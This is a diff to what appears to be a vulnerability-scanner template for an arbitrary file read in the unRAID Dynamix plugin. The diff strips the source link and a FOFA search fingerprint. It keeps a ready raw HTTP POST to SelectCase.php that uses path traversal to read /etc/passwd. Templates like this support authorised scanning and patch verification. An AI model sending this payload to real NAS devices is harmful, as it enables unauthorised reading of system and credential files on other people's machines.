@@ -3,17 +3,11 @@ info:
   name: NAS设备 unraid Dynamix 插件 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kdlq0og5wi6x2pn3'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kdlq0og5wi6x2pn3
-    fofa: '"/webGui/images/banner.png"'
 http:
 - raw:
   - 'POST /plugins/dynamix/include/SelectCase.php?file=../../../../etc/passwd HTTP/1.1
-
-
 
 
     csrf_token=9855BE5478D13A31&mode=get
